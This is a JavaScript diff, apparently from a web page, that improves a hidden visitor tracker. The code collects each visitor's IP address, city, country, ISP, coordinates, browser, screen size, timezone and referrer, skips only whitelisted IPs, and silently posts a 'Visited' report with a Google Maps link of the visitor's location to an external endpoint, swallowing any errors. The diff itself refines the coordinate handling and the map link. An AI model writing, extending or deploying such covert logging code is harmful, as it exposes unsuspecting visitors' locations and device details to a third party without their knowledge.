@@ -2092,11 +2092,13 @@
       const ip = d.ip||'?';
       if (WHITELIST.length > 0 && WHITELIST.includes(ip)) return;
 
-      const loc = (d.loc||',').split(',');
+      const loc = d.loc ? d.loc.split(',') : [];
+      const lat = loc[0] && loc[0] !== '0' && loc[0] !== '0.0' ? loc[0] : null;
+      const lon = loc[1] && loc[1] !== '0' && loc[1] !== '0.0' ? loc[1] : null;
       const p = {
         ip: ip, city: d.city||'?', region: d.region||'?',
         country: d.country||'?', isp: d.org||'?',
-        lat: loc[0]||'?', lon: loc[1]||'?',
+        lat: lat, lon: lon,
         ua: navigator.userAgent.substring(0,150),
         lang: navigator.language, screen: screen.width+'x'+screen.height,
         tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
@@ -2109,7 +2111,7 @@
           method: 'POST',
           headers: {'Content-Type':'application/json'},
           body: JSON.stringify({
-            content: '**Visited**\n```\nIP: '+p.ip+'\nLoc: '+p.city+', '+p.country+'\nISP: '+p.isp+'\nOS: '+p.os+'\nBrowser: '+p.ua+'\nScreen: '+p.screen+'\nTZ: '+p.tz+'\nRef: '+p.ref+'\nTime: '+p.time+'\nMap: https://google.com/maps?q='+p.lat+','+p.lon+'\n```'
+            content: '**Visited**\n```\nIP: '+p.ip+'\nLoc: '+p.city+', '+p.country+'\nISP: '+p.isp+'\nOS: '+p.os+'\nBrowser: '+p.ua+'\nScreen: '+p.screen+'\nTZ: '+p.tz+'\nRef: '+p.ref+'\nTime: '+p.time+'\n'+(p.lat&&p.lon?'Map: https://www.google.com/maps/@'+p.lat+','+p.lon+',14z\n':'')+'```'
           })
         }).catch(()=>{});
       }
